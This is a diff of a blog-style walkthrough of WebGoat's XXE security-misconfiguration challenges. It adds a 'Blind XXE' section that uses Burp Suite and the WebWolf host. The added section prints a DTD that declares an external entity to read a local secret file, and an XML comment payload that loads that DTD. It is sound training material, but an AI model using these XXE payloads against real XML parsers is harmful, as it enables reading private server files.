@@ -94,30 +94,87 @@ Line 1 is an *XML declaration* which indicates the version of XML being used. Th
 I see in the screenshot above I left the named entity off of my payload by accident so the contents of the file system weren't displayed in the comments at the time. For some reason the challenge still displayed as successful though.
 
 ![complete1](/docs/assets/images/webgoat/misconfigs/xxe05.png)
+
+Refreshing the page actually deleted all of the comments and messed up the rest of the lesson which was interesting as well. 
+
+![weird](/docs/assets/images/webgoat/misconfigs/xxe06.png)
 ---
 
 **Challenge 2**
 
 *Modern Rest Framework*
 
-![Challenge2](/docs/assets/images/webgoat/misconfigs/xxe06.png)
+![challenge2](/docs/assets/images/webgoat/misconfigs/xxe07.png)
 
 This challenge wants me to repeat the XML injections from the previous exercise and see what happens. So I load up burp and try again. 
 
-![request2](/docs/assets/images/webgoat/misconfigs/xxe07.png)
+![request2](/docs/assets/images/webgoat/misconfigs/xxe08.png)
 
-![editrequest2](/docs/assets/images/webgoat/misconfigs/xxe08.png)
+![edit2](/docs/assets/images/webgoat/misconfigs/xxe09.png)
 
 I receive an error message telling me that I am posting *JSON*.
 
-![json error](/docs/assets/images/webgoat/misconfigs/xxe09.png)
+![json error](/docs/assets/images/webgoat/misconfigs/xxe10.png)
 
 If I go back and check out that request I can see that the *Content-Type* in the header is listed as JSON. If I just change this to *XML* and then forward the payload it will satisfy the challenge. 
 
-![content type](/docs/assets/images/webgoat/misconfigs/xxe10.png)
+![content type](/docs/assets/images/webgoat/misconfigs/xxe11.png)
 
-![request edit](/docs/assets/images/webgoat/misconfigs/xxe11.png)
+![content type edit](/docs/assets/images/webgoat/misconfigs/xxe12.png)
 
-![complete2](/docs/assets/images/webgoat/misconfigs/xxe12.png)
+![complete2](/docs/assets/images/webgoat/misconfigs/xxe13.png)
+---
 
+**Challenge 3**
 
+*Blind XXE*
+
+![challenge 3](/docs/assets/images/webgoat/misconfigs/xxe14.png)
+
+The goal for this challenge is to create a *Document Type Definition* file that will get the content of the file located at `/home/crumbles/.webgoat-2023.4//XXE/crumbles/secret.txt` and input it as a comment on the challenge. 
+
+To start off the challenge I capture a comment submission in Burp Suite so I can see what it looks like. Much like the other exercises it's a POST request using XML data to post a comment.  Forwarding the request just fails the challenge. 
+
+![request 3](/docs/assets/images/webgoat/misconfigs/xxe15.png)
+
+![failed3](/docs/assets/images/webgoat/misconfigs/xxe16.png)
+
+The challenge says "Try to upload this file using WebWolf landing page". So I'll go ahead and log into that.
+
+![webwolf](/docs/assets/images/webgoat/misconfigs/xxe17.png)
+
+Next I need to craft the payload into a file to upload then upload it to WebWolf. 
+
+```
+<?xml version="1.0" encoding="UTF-8"?> 
+
+<!ENTITY secret SYSTEM 'file:///home/crumbles/.webgoat-2023.4//XXE/crumbles/secret.txt'> 
+```
+
+![vim](/docs/assets/images/webgoat/misconfigs/xxe18.png)
+
+![upload](/docs/assets/images/webgoat/misconfigs/xxe19.png)
+
+I can retrieve the link to the payload from the blue link on the WebWolf page and then I just need to craft it into an XML payload on the comment POST request in Burp Suite. 
+
+`http://127.0.0.1:9090/files/crumbles/payload.dtd`
+
+```
+<?xml version="1.0"?> 
+  <!DOCTYPE attack1 [ 
+  <!ENTITY % attack1dtd SYSTEM 
+  "http://127.0.0.1:9090/files/crumbles/payload.dtd"> 
+  %attack1dtd; 
+  ]> 
+  <comment>  <text>New Comment &secret;</text></comment> 
+```
+
+![payload](/docs/assets/images/webgoat/misconfigs/xxe20.png)
+
+![comment](/docs/assets/images/webgoat/misconfigs/xxe21.png)
+
+Then I just submit the contents of the comment in the comment field and the challenge is complete.  
+
+![complete 3](/docs/assets/images/webgoat/misconfigs/xxe22.png)
+
+That's it for WebGoats Security Misconfiguration Challenges. 
